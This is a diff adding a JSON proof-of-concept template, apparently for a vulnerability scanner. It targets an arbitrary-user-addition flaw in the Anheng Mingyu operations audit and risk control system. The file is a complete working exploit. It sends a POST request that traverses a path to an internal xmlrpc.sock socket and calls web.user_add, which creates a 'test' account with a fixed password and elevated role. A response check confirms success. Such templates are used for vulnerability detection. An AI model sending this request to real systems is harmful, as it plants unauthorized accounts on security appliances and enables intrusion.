@@ -1,0 +1,19 @@
+{
+  "poc": "安恒明御运维审计与风险控制系统xmlrpc.sock任意用户添加漏洞",
+  "req":[
+    {
+      "method": "POST",
+      "uri": "/service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": "application/x-www-form-urlencoded"
+      },
+      "data": "<?xml version=\"1.0\"?>  \n<methodCall>\n<methodName>web.user_add</methodName>\n<params>\n<param>\n<value>\n<array>\n<data>\n<value>\n<string>admin</string>\n</value>\n<value>\n<string>5</string>\n</value>\n<value>\n<string>10.0.0.1</string>\n</value>\n</data>\n</array>\n</value>\n</param>\n<param>\n<value>\n<struct>\n<member>\n<name>uname</name>\n<value>\n<string>test</string>\n</value>\n</member>\n<member>\n<name>name</name>\n<value>\n<string>test</string>\n</value>\n</member>\n<member>\n<name>pwd</name>\n<value>\n<string>1qaz@3edC12345</string>\n</value>\n</member>\n<member>\n<name>authmode</name>\n<value>\n<string>1</string>\n</value>\n</member>\n<member>\n<name>deptid</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>email</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>mobile</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>comment</name>\n<value>\n<string></string>\n</value>\n</member>\n<member>\n<name>roleid</name>\n<value>\n<string>102</string>\n</value>\n</member>\n</struct></value>\n</param>\n</params>\n</methodCall>",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["uname"]
+      }
+    }
+  ]
+}
